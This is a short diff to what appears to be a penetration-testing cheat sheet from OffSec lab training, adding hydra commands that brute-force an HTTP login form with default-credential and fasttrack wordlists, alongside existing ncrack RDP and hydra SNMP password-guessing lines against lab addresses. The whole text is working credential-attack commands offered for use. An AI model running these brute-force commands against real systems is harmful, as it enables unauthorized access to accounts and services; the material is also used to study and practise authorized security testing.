@@ -11,3 +11,7 @@ ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35
 
 #SNMP Brute:
 hydra -P password-file.txt -v 10.11.1.219 snmp
+
+#HTTP Cracking with Hydra 
+hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 192.168.92.140 http-get-form "/loginform.asp:uname=^USER^&psw=^PASS^:Please login to view the content"
+hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/fasttrack.txt 192.168.92.140 http-get-form "/loginform.asp:uname=^USER^&psw=^PASS^:Please login to view the content"
